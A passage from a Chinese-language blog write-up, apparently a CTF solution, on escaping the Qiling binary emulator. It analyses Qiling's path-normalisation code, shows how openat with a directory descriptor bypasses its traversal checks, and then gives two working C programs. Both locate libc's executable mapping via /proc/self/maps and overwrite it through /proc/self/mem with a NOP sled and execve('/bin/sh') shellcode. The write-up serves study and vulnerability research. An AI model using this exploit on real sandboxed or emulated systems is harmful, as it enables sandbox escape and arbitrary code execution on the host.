class=\"token punctuation\">.</span>normalize<span class=\"token punctuation\">(</span>_cwd <span class=\"token operator\">/</span> _path<span class=\"token punctuation\">.</span>as_posix<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">convert_path</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> rootfs<span class=\"token punctuation\">:</span> Union<span class=\"token punctuation\">[</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> Path<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> cwd<span class=\"token punctuation\">:</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> path<span class=\"token punctuation\">:</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span> Path<span class=\"token punctuation\">:</span>\n    emulated_os <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>ql<span class=\"token punctuation\">.</span>ostype\n    hosting_os <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>ql<span class=\"token punctuation\">.</span>platform_os\n\n    <span class=\"token comment\"># emulated os and hosting platform are of the same type</span>\n    <span class=\"token keyword\">if</span>  <span class=\"token punctuation\">(</span>emulated_os <span class=\"token operator\">==</span> hosting_os<span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token punctuation\">(</span>emulated_os <span class=\"token keyword\">in</span> QL_OS_POSIX <span class=\"token keyword\">and</span> hosting_os <span class=\"token keyword\">in</span> QL_OS_POSIX<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> QlPathManager<span class=\"token punctuation\">.</span>convert_for_native_os<span class=\"token punctuation\">(</span>rootfs<span class=\"token punctuation\">,</span> cwd<span class=\"token punctuation\">,</span> path<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">elif</span> emulated_os <span class=\"token keyword\">in</span> QL_OS_POSIX <span class=\"token keyword\">and</span> hosting_os <span class=\"token operator\">==</span> QL_OS<span class=\"token punctuation\">.</span>WINDOWS<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> QlPathManager<span class=\"token punctuation\">.</span>convert_posix_to_win32<span class=\"token punctuation\">(</span>rootfs<span class=\"token punctuation\">,</span> cwd<span class=\"token punctuation\">,</span> path<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">elif</span> emulated_os <span class=\"token operator\">==</span> QL_OS<span class=\"token punctuation\">.</span>WINDOWS <span class=\"token keyword\">and</span> hosting_os <span class=\"token keyword\">in</span> QL_OS_POSIX<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> QlPathManager<span class=\"token punctuation\">.</span>convert_win32_to_posix<span class=\"token punctuation\">(</span>rootfs<span class=\"token punctuation\">,</span> cwd<span class=\"token punctuation\">,</span> path<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> QlPathManager<span class=\"token punctuation\">.</span>convert_for_native_os<span class=\"token punctuation\">(</span>rootfs<span class=\"token punctuation\">,</span> cwd<span class=\"token punctuation\">,</span> path<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里建立了rootfs，第一步肯定是想到的路径穿越，比如../../../../这种，但是实验发现../../../test也会被拼接成rootfs/test，原因在于convert_for_native_os函数中利用了normalize进行了处理，导致无法进行路径穿越：</p>\n<p><img src=\"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/qilin2.png\" alt=\"image-20220125190221473\"></p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">normalize</span><span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">:</span> Union<span class=\"token punctuation\">[</span>Path<span class=\"token punctuation\">,</span> PurePath<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span> Union<span class=\"token punctuation\">[</span>Path<span class=\"token punctuation\">,</span> PurePath<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\"># expected types: PosixPath, PurePosixPath, WindowsPath, PureWindowsPath</span>\n    <span class=\"token keyword\">assert</span> <span class=\"token builtin\">isinstance</span><span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>Path<span class=\"token punctuation\">,</span> PurePath<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'did not expect </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span><span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>__name__<span class=\"token conversion-option punctuation\">!r</span><span class=\"token punctuation\">}</span></span><span class=\"token string\"> here'</span></span>\n\n    normalized_path <span class=\"token operator\">=</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token comment\"># remove anchor (necessary for Windows UNC paths) and convert to relative path</span>\n    <span class=\"token keyword\">if</span> path<span class=\"token punctuation\">.</span>is_absolute<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        path <span class=\"token operator\">=</span> path<span class=\"token punctuation\">.</span>relative_to<span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">.</span>anchor<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">for</span> p <span class=\"token keyword\">in</span> path<span class=\"token punctuation\">.</span>parts<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> p <span class=\"token operator\">==</span> <span class=\"token string\">'.'</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">continue</span>\n\n        <span class=\"token keyword\">if</span> p <span class=\"token operator\">==</span> <span class=\"token string\">'..'</span><span class=\"token punctuation\">:</span>\n            normalized_path <span class=\"token operator\">=</span> normalized_path<span class=\"token punctuation\">.</span>parent\n            <span class=\"token keyword\">continue</span>\n\n        normalized_path <span class=\"token operator\">/=</span> p\n\n    <span class=\"token keyword\">return</span> normalized_path<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>符号链接就可以绕过检查，但是遗憾的是qiling没有实现symlink的系统调用，不过，回看open_ql_file的代码可以看出，如果dir_fd存在，那么就可以绕过这些检查，这时候自然就可以想到ql_syscall_openat的实现，这个就很简单，里面也没什么严格的检查，因此就可以实现目录穿越。</p>\n<h3 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h3><p>​        在实现了目录穿越之后其实问题就变得简单了，我们可以通过/proc/self/maps获取到自身进程的内存信息，然后通过/proc/self/mem实现恶意代码执行，进而完成逃逸，这里展示一个小demo。</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdio.h&gt;</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;fcntl.h&gt;</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;string.h&gt;</span></span>\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> nop<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> code<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x6a\\x68\\x48\\xb8\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x2f\\x73\\x50\\x48\\x89\\xe7\\x68\\x72\\x69\\x1\\x1\\x81\\x34\\x24\\x1\\x1\\x1\\x1\\x31\\xf6\\x56\\x6a\\x8\\x5e\\x48\\x1\\xe6\\x56\\x48\\x89\\xe6\\x31\\xd2\\x6a\\x3b\\x58\\xf\\x5\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">4096</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"0\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> fd <span class=\"token operator\">=</span> <span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/proc/self/maps\"</span><span class=\"token punctuation\">,</span> O_RDONLY<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> fd_mem <span class=\"token operator\">=</span> <span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/proc/self/mem\"</span><span class=\"token punctuation\">,</span> O_RDWR<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    FILE <span class=\"token operator\">*</span>fp_map <span class=\"token operator\">=</span> <span class=\"token function\">fdopen</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> addr <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span> buf<span class=\"token punctuation\">,</span> fp_map<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strstr</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> <span class=\"token string\">\"r-xp\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token constant\">NULL</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">strstr</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> <span class=\"token string\">\"libc-\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token function\">sscanf</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> <span class=\"token string\">\"%lx-\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token function\">lseek</span><span class=\"token punctuation\">(</span>fd_mem<span class=\"token punctuation\">,</span> addr<span class=\"token punctuation\">,</span> <span class=\"token constant\">SEEK_SET</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">&lt;</span><span class=\"token number\">150</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">write</span><span class=\"token punctuation\">(</span>fd_mem<span class=\"token punctuation\">,</span> nop<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span> nop <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span>fd_mem<span class=\"token punctuation\">,</span> code<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span> code<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>不过大家可能会好奇，mem的权限为啥允许写入shellcode：</p>\n<p><img src=\"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/qilin3.png\" alt=\"image-20220127104107416\"></p>\n<p>答案可以参考这篇文章：</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><a href=\"https://www.anquanke.com/post/id/257350#h2-0\">https://www.anquanke.com/post/id/257350#h2-0</a></p></blockquote>\n<p>至此，我们其实就拥有了整个攻击链，先进行目录穿越找到/proc/self/mem，然后写入shellcode。</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">long</span> start_addr<span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// Open mappings</span>\n    <span class=\"token keyword\">int</span> map <span class=\"token operator\">=</span> <span class=\"token function\">openat</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/proc/self/maps\"</span><span class=\"token punctuation\">,</span> O_RDONLY<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// Open Python process memory</span>\n    <span class=\"token keyword\">int</span> mem <span class=\"token operator\">=</span> <span class=\"token function\">openat</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/proc/self/mem\"</span><span class=\"token punctuation\">,</span> O_RDWR<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    FILE <span class=\"token operator\">*</span>fp_map <span class=\"token operator\">=</span> <span class=\"token function\">fdopen</span><span class=\"token punctuation\">(</span>map<span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// Find the first executable mapping for Libc</span>\n    <span class=\"token keyword\">char</span> line<span class=\"token punctuation\">[</span><span class=\"token number\">4096</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span> line<span class=\"token punctuation\">,</span> fp_map<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">size_t</span> len <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strstr</span><span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">,</span> <span class=\"token string\">\"r-xp\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">strstr</span><span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">,</span> <span class=\"token string\">\"libc-\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token comment\">// Retrive start address of mapping</span>\n            <span class=\"token function\">sscanf</span><span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">,</span> <span class=\"token string\">\"%lx-\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>start_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%lx\\n\"</span><span class=\"token punctuation\">,</span> start_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">// Seek to the address of the executable mapping for Libc</span>\n    <span class=\"token function\">lseek</span><span class=\"token punctuation\">(</span>mem<span class=\"token punctuation\">,</span> start_addr<span class=\"token punctuation\">,</span> <span class=\"token constant\">SEEK_SET</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">write</span><span class=\"token punctuation\">(</span>mem<span class=\"token punctuation\">,</span> nop<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span> nop <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token comment\">// Write the payload into the executable mapping</span>\n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span>mem<span class=\"token punctuation\">,</span> code<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span> code<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>shellcode就不贴了，占地方，可以参考上面那个demo里面的。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" 